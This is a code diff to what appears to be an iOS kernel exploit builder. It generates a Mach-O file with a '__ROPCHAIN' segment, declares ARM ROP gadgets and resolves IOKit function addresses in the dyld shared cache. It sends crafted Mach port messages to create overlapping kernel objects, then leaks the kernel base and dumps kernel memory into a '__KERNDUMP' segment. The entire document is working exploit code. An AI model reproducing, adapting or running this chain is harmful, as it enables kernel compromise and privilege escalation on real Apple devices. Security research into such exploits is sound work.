@@ -402,22 +402,24 @@ int main(int argc, const char * argv[]) {
     
     /* write mach header */
     
-    struct mach_header mh;
-    mh.magic = MH_MAGIC;
-    mh.filetype = MH_EXECUTE; // must be MH_EXECUTE non-PIE (bug 1)
-    mh.flags = 0; // must be MH_EXECUTE non-PIE (bug 1)
-    mh.cputype = CPU_TYPE_ARM;
-    mh.cpusubtype = CPU_SUBTYPE_ARM_V7S;
-    mh.ncmds=0;
-    mh.sizeofcmds=0;
     
     xnuexp_mach_o * dy = [xnuexp_mach_o withContentsOfFile:dyld_path];
     //    assert(dy.hdr->cpusubtype == mh.cpusubtype && dy.hdr->cputype == mh.cputype);
     if (!dy) {
         xnuexp_fat_mach_o  * fat_dy = [xnuexp_fat_mach_o withContentsOfFile:dyld_path];
-        dy = [fat_dy getArchitectureByFirstMagicMatch:mh.magic];
+        dy = [fat_dy getArchitectureByFirstMagicMatch:MH_MAGIC];
         assert(fat_dy && dy);
     }
+
+    struct mach_header mh;
+    mh.magic = dy.hdr->magic;
+    mh.filetype = MH_EXECUTE; // must be MH_EXECUTE non-PIE (bug 1)
+    mh.flags = 0; // must be MH_EXECUTE non-PIE (bug 1)
+    mh.cputype = dy.hdr->cputype;
+    mh.cpusubtype = dy.hdr->cpusubtype;
+    mh.ncmds=0;
+    mh.sizeofcmds=0;
+
     /* required on iOS */
     
     struct dyld_info_command dyld_ic;
@@ -507,20 +509,20 @@ int main(int argc, const char * argv[]) {
     
     load_cmd_seg.vmaddr = 0x51000000;
     load_cmd_seg.fileoff = fsz;
-    load_cmd_seg.filesize = 0x300000;
-    load_cmd_seg.vmsize = 0x300000;
+    load_cmd_seg.filesize = 0x500000;
+    load_cmd_seg.vmsize = 0x500000;
     strcpy(&load_cmd_seg.segname[0], "__ROPCHAIN");
     memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
     mh.sizeofcmds += load_cmd_seg.cmdsize;
     mh.ncmds++;
     uint32_t *stack = (uint32*)(buf + fsz + 0x4000);
-    uint32_t *stackz = (uint32*)(buf + fsz + 0x200000 + 0x4000);
-    uint32_t *stacky = (uint32*)(buf + fsz + 0x100000 + 0x4000);
+    uint32_t *stackz = (uint32*)(buf + fsz + 0x100000 + 0x4000);
+    uint32_t *stacky = (uint32*)(buf + fsz + 0x90000 + 0x4000);
     
     uint32_t *stackbase = stack;
     uint32_t segstackbase = load_cmd_seg.vmaddr + 0x4000;
-    uint32_t segstackzbase = load_cmd_seg.vmaddr + 0x200000 + 0x4000;
-    uint32_t segstackybase = load_cmd_seg.vmaddr + 0x100000 + 0x4000;
+    uint32_t segstackzbase = load_cmd_seg.vmaddr + 0x100000 + 0x4000;
+    uint32_t segstackybase = load_cmd_seg.vmaddr + 0x90000 + 0x4000;
     
     
     DeclGadget(mov_sp_r4_pop_r4r7pc, (&(char[]){0xa5,0x46,0x90,0xbd}), 4);
@@ -1020,12 +1022,12 @@ StoreR0(push, where)
     
     argss->waitTime.tv_sec = 10;
     argss->waitTime.tv_nsec = 10000000;
-    argss->_io_service_get_matching_service = 0x293b491;
-    argss->_io_connect_method_scalarI_structureI = 0x2938038 + 1;
-    argss->_IOServiceOpen = 0x28fe4e0 + 1;
-    argss->_IOServiceClose = 0x28fe524 + 1;
-    argss->_IOServiceWaitQuiet = 0x28fe424 + 1;
-    argss->_host_get_io_master = 0x1095da11;
+    argss->_io_service_get_matching_service = IOKIT_io_service_get_matching_service - DYCACHE_BASE + 1;
+    argss->_io_connect_method_scalarI_structureI = IOKIT_io_connect_method_scalarI_structureI - DYCACHE_BASE + 1;
+    argss->_IOServiceOpen = IOKIT_IOServiceOpen - DYCACHE_BASE + 1;
+    argss->_IOServiceClose = IOKIT_IOServiceClose - DYCACHE_BASE + 1;
+    argss->_IOServiceWaitQuiet = IOKIT_IOServiceWaitQuiet - DYCACHE_BASE + 1;
+    argss->_host_get_io_master = LS_K_host_get_io_master - DYCACHE_BASE + 1;
     argss->oolmsg_template.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
     argss->oolmsg_template.header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
     argss->oolmsg_template.header.msgh_local_port = MACH_PORT_NULL;
@@ -1055,7 +1057,6 @@ StoreR0(push, where)
     strcpy(argss->msga, "found overlapping object\n");
     strcpy(argss->msgb, "found overlapped object\n");
     strcpy(argss->testmsg, "ret: %08x\n");
-    // strcpy(argss->b, "/var/mobile/Media/dy_cache");
     
     RopFixupLR(PUSH);
     RopCallFunction2(PUSH, @"___syscall", 294, SEG_VAR(cache_slide));
@@ -1064,34 +1065,10 @@ StoreR0(push, where)
     RopNopSlide(PUSH);
     StoreR0(PUSH, SEG_VAR(fd1));
     
-    RopCallFunction3(PUSH, @"_open", SEG_VAR(b), O_RDWR|O_CREAT, 0666);
+    RopCallFunction3(PUSH, @"_open", SEG_VAR(b), O_RDWR|O_CREAT|O_TRUNC, 0666);
     RopNopSlide(PUSH);
     StoreR0(PUSH, SEG_VAR(fd2));
-    
-    /*
-     RopCallFunction3(PUSH, @"_open", SEG_VAR(b), O_RDWR|O_CREAT, 0666);
-     RopNopSlide(PUSH);
-     StoreR0(PUSH, SEG_VAR(fd2));
-     
-     RopCallFunction9Deref2(PUSH, @"_write", 0, SEG_VAR(fd2), 1, SEG_VAR(cache_slide), 0, 0, 0x15d30000, 0,0, 0, 0 ,0, 0);
-     RopNopSlide(PUSH);
-     StoreR0(PUSH, SEG_VAR(copyaddr));
-     [dy setSlide:dy.slide+1]; // enter thumb
-     
-     RopCallFunction9Deref2(PUSH, @"_fprintf", 2, SEG_VAR(fd1), 3, SEG_VAR(fd2), 0, SEG_VAR(initmsg), 0, 0, 0, 0, 0, 0, 0);
-     
-     // RopCallFunction9Deref2(PUSH, @"__platform_memmove", 0, SEG_VAR(copyaddr), 1, SEG_VAR(readaddr), 0, 0, 0x10a48000, 0, 0, 0, 0, 0, 0);
-     [dy setSlide:dy.slide-1]; // exit thumb
-     RopCallFunction2(PUSH, @"___syscall", SYS_exit, 0);
-     */
-    
-    RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceOpen), SEG_VAR(cache_slide));
-    RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceWaitQuiet), SEG_VAR(cache_slide));
-    RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceClose), SEG_VAR(cache_slide));
-    RopAddWriteDeref(PUSH, SEG_VAR(_io_connect_method_scalarI_structureI), SEG_VAR(cache_slide));
-    RopAddWriteDeref(PUSH, SEG_VAR(_io_service_get_matching_service), SEG_VAR(cache_slide));
-    RopAddWriteDeref(PUSH, SEG_VAR(_host_get_io_master), SEG_VAR(cache_slide));
-    
+
     RopCallFunction0(PUSH, @"_task_self_trap");
     StoreR0(PUSH, SEG_VAR(mach_task_self));
     
@@ -1489,13 +1466,7 @@ step(i);\
     RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceClose), 0, SEG_VAR(gasgauge_), 1, SEG_VAR(zero), 0, 0, 0, 0, 0, 0, 0, 0, 0,0);
     argss->waitTime.tv_sec = 1;
     argss->waitTime.tv_nsec = 1000000;
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
+    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(svc), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
     [dy setSlide:dy.slide-1]; // exit thumb
     SendMsg(PUSH, overlapped_port, oolmsg_template_512);
     
@@ -1564,9 +1535,7 @@ step(i);\
     RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_text_base),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
     [dy setSlide:dy.slide-1]; // exit thumb
     
-    char* kern_dump = (char*)0x54000000;
-
-    for (int i = 0; i < 0x70; i++) {
+    for (int i = 0; i < 0x60; i++) {
         ReadWriteOverlap();
         tmptoscratch();
         LoadIntoR0(PUSH, SEG_VAR(kern_text_base));
@@ -1636,7 +1605,7 @@ step(i);\
     load_cmd_seg.vmaddr = 0x54000000;
     load_cmd_seg.fileoff = fsz;
     load_cmd_seg.filesize = 0;
-    load_cmd_seg.vmsize = 0x10000000;
+    load_cmd_seg.vmsize = 0x600000;
     strcpy(&load_cmd_seg.segname[0], "__KERNDUMP");
     memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
     mh.sizeofcmds += load_cmd_seg.cmdsize;
